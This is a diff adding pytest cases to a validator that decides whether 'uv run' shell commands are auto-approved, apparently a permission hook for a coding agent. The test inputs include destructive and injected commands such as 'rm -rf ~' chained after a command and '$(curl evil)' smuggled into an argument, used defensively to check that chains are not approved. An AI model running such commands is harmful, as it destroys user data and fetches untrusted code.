@@ -883,6 +883,30 @@ class TestUvRunEnvFlagNormalization:
         assert isinstance(result, HookAllow)
         assert "DX007" in result.message
 
+    def test_simple_inner_command_decides(self, validator: PrefixFrictionValidator) -> None:
+        """GH-1795: the uv-run normalize allow skips the prompt."""
+        from dev10x.domain import HookAllow
+
+        result = validator.validate(inp=_make_input(command="uv run --extra dev mypy src/"))
+        assert isinstance(result, HookAllow)
+        assert result.decides is True
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uv run --extra dev mypy src/ && rm -rf ~",
+            "uv run --extra dev mypy $(curl evil)",
+            "uv run --directory apps/api pytest; rm -rf /tmp/x",
+        ],
+    )
+    def test_chained_inner_command_only_advises(
+        self, validator: PrefixFrictionValidator, command: str
+    ) -> None:
+        """A prefix match on the whole string cannot vouch for a chain."""
+        result = validator.validate(inp=_make_input(command=command))
+
+        assert getattr(result, "decides", False) is False
+
     def test_with_pkg_disqualifies_auto_approval(self, validator: PrefixFrictionValidator) -> None:
         # `--with httpx` installs an arbitrary package — never auto-approve;
         # falls through to the fence-tool ask (no HookAllow).
